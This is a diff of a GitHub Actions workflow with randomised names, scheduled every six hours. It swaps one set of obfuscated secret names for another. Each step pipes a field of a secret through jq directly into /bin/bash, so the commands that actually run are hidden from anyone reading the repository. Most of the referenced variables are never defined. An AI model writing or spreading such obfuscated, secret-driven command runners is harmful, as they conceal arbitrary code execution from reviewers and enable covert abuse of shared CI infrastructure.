@@ -1,28 +1,26 @@
 name: fengyuanchai4545
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
+    - cron: '53 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fengyuanchai4545
         env:
-          a75224: ${{ secrets.a75224 }}
+          yfad32087: ${{ secrets.yfad32087 }}
         run: |
-          echo $a75224 | jq -r .drz58 | /bin/bash
-          echo $m92093 | jq -r .t67001 | /bin/bash
-          echo $fcw26446 | jq -r .n3 | /bin/bash
-          echo $hz9085 | jq -r .x4 | /bin/bash
-          echo $n8228 | jq -r .xxfeo18530 | /bin/bash
-          echo $rblpa81 | jq -r .c73 | /bin/bash
-          echo $bfsi05 | jq -r .ect40 | /bin/bash
-          echo $mfyc185 | jq -r .brzm95 | /bin/bash
-          echo $a2 | jq -r .ndj5519 | /bin/bash
-          echo $d59429 | jq -r .fu3008 | /bin/bash
-          echo $nivd3 | jq -r .mkfdj6993 | /bin/bash
-          echo $qqh1 | jq -r .pfq44180 | /bin/bash
-          echo $h8210 | jq -r .jbpe9 | /bin/bash
+          echo $yfad32087 | jq -r .jxkmq2055 | /bin/bash
+          echo $tjsd583 | jq -r .zt94 | /bin/bash
+          echo $qmoul40618 | jq -r .qrlcg90 | /bin/bash
+          echo $tfp87776 | jq -r .dzhf716 | /bin/bash
+          echo $nlw6002 | jq -r .o40 | /bin/bash
+          echo $gyd09094 | jq -r .fjj409 | /bin/bash
+          echo $cyad01 | jq -r .k44532 | /bin/bash
+          echo $c088 | jq -r .ukg7221 | /bin/bash
+          echo $zy217 | jq -r .lucl7 | /bin/bash
 
